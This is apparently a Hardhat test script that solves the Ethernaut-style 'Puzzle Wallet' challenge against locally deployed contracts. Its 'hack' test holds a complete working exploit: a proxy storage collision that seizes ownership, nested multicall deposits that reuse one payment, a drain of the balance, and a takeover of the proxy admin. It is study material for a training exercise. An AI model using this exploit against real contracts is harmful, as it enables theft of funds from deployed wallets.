const { ethers, deployments, getNamedAccounts, waffle } = require("hardhat")
const { deploy } = deployments
const { assert, expect } = require("chai")

describe("Puzzle Wallet", () => {
    let puzzleProxy,puzzleWallet, deployer, attacker, provider, constructorArgs
    before(async () => {
        provider = waffle.provider
        const accounts = await ethers.getSigners()
        deployer = accounts[0]
        attacker = accounts[1]

        const puzzleWallets = await deploy("PuzzleWallet",{
            from: deployer.address,
            args:[]
        })

        await deploy("PuzzleProxy", {
            from: deployer.address,
            args: [deployer.address,puzzleWallets.address,"0xb7b0422d00000000000000000000000000000000000000000000000000038d7ea4c68000"]
        })
        puzzleProxy = await ethers.getContract("PuzzleProxy")
        puzzleWallet = await ethers.getContractAt("PuzzleWallet", puzzleProxy.address)
        
        await puzzleWallet.addToWhitelist(deployer.address)
        await puzzleWallet.deposit({value: ethers.utils.parseEther("0.001")})

    })

    describe("Let's Initialize thing's", ()=>{
        it("checks the owner of the puzzle wallet", async()=>{
            const owner = await puzzleWallet.owner()
            const bala =  await provider.getBalance(puzzleWallet.address)
            assert.equal(owner.toString(), deployer.address)
            assert.equal(bala.toString(), "1000000000000000")
        })

    })
    describe("Let's hack the contract", ()=>{
        it("Changes the owner of Puzzle wallet,", async()=>{
            const hackerConnectedProxy =  await puzzleProxy.connect(attacker)
            await hackerConnectedProxy.proposeNewAdmin(attacker.address)
            const newOwner = await puzzleWallet.owner()
            assert.equal(newOwner.toString(), attacker.address)    //Attacker is now the owner of the Puzzle wallet contract
            const hackerConnectedPuzzle = await puzzleWallet.connect(attacker)
            await hackerConnectedPuzzle.addToWhitelist(attacker.address)
            
            const iface = new hre.ethers.utils.Interface(["function init(uint256)", "function deposit()", "function multicall(bytes[])"])
            const deep_enc = iface.encodeFunctionData("deposit",[])
            const mul_enc = iface.encodeFunctionData("multicall",[[deep_enc,]])

            const tx = await hackerConnectedPuzzle.multicall(Array(30).fill(mul_enc),{value:"1000000000000000"})
            await tx.wait()
            const bala =  await provider.getBalance(puzzleWallet.address)
            const balanceOfAttacker = await hackerConnectedPuzzle.balances(attacker.address)
            console.log(`The balance of the contract is${bala.toString()}`)
            console.log(`The balance of the attacker is ${balanceOfAttacker.toString()}`)  //We exceed the maximum balance
            await hackerConnectedPuzzle.execute(attacker.address,"2000000000000000", [])
            const balaNew =  await provider.getBalance(puzzleWallet.address)
            console.log(`The new balance of the contract is ${balaNew.toString()}`)
            assert.equal(balaNew.toString(),"0")

            await hackerConnectedPuzzle.setMaxBalance(attacker.address)
            const newAdminProxy = await hackerConnectedProxy.admin()
            assert.equal(newAdminProxy.toString(), attacker.address)
            // assert.equal(bala.toString(),"2000000000000000")

            //Completed
        })
    })

})
